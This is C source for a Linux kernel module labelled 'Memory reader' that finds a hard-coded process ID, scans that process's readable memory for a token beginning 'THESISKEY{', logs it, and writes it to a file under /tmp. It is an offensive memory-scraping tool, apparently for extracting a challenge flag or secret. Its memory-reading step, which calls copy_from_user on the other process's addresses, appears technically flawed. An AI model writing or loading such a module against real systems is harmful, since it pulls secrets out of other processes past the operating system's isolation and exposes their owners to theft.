MODULE_AUTHOR("researcher");
MODULE_DESCRIPTION("Memory reader");

#define TARGET_PID 2545
#define TOKEN_PREFIX "THESISKEY{"
#define OUTFILE "/tmp/thesis-ipc/token.txt"

static int __init readmem_init(void) {
    struct pid *pid_struct;
    struct task_struct *task;
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    unsigned long addr;
    char buf[512];
    size_t prefix_len = strlen(TOKEN_PREFIX);
    int found = 0;

    printk(KERN_INFO "readmem: Starting memory search for PID %d\n", TARGET_PID);

    // Find the task
    pid_struct = find_get_pid(TARGET_PID);
    if (!pid_struct) {
        printk(KERN_ERR "readmem: Cannot find PID %d\n", TARGET_PID);
        return -ESRCH;
    }

    task = pid_task(pid_struct, PIDTYPE_PID);
    if (!task) {
        printk(KERN_ERR "readmem: Cannot get task for PID %d\n", TARGET_PID);
        put_pid(pid_struct);
        return -ESRCH;
    }

    printk(KERN_INFO "readmem: Found task: %s (pid=%d)\n", task->comm, task->pid);

    mm = get_task_mm(task);
    if (!mm) {
        printk(KERN_ERR "readmem: Cannot get mm for PID %d\n", TARGET_PID);
        put_pid(pid_struct);
        return -EINVAL;
    }

    // Walk VMAs looking for the token
    mmap_read_lock(mm);
    for (vma = mm->mmap; vma != NULL; vma = vma->vm_next) {
        // Only scan readable anonymous pages (heap, stack, etc.)
        if (!(vma->vm_flags & VM_READ)) continue;

        // Scan this VMA in chunks
        for (addr = vma->vm_start; addr < vma->vm_end - 512 && !found; addr += 256) {
            if (copy_from_user(buf, (void __user *)addr, 512) != 0)
                continue;

            // Search for token prefix
            int i;
            for (i = 0; i < 256; i++) {
                if (memcmp(buf + i, TOKEN_PREFIX, prefix_len) == 0) {
                    // Found! Extract the full token
                    char token[256] = {0};
                    int j = 0;
                    while (i+j < 512 && j < 200) {
                        char c = buf[i+j];
                        if (c == '}') {
                            token[j++] = c;
                            break;
                        }
                        if (c == 0) break;
                        token[j++] = c;
                    }
                    token[j] = 0;

                    printk(KERN_INFO "readmem: FOUND TOKEN at 0x%lx: %s\n", addr+i, token);

                    // Write to IPC file
                    {
                        struct file *f = filp_open(OUTFILE, O_WRONLY|O_CREAT|O_TRUNC, 0644);
                        if (!IS_ERR(f)) {
                            kernel_write(f, token, strlen(token), &f->f_pos);
                            kernel_write(f, "\n", 1, &f->f_pos);
                            filp_close(f, NULL);
                        }
                    }

                    found = 1;
                    break;
                }
            }
        }
        if (found) break;
    }
    mmap_read_unlock(mm);

    mmput(mm);
    put_pid(pid_struct);

    if (!found) {
        printk(KERN_INFO "readmem: Token not found in process memory\n");
    }

    return 0;  // Return 0 so module loads; it will do its work and can be unloaded
}

static void __exit readmem_exit(void) {
    printk(KERN_INFO "readmem: Module unloaded\n");
}

module_init(readmem_init);
module_exit(readmem_exit);
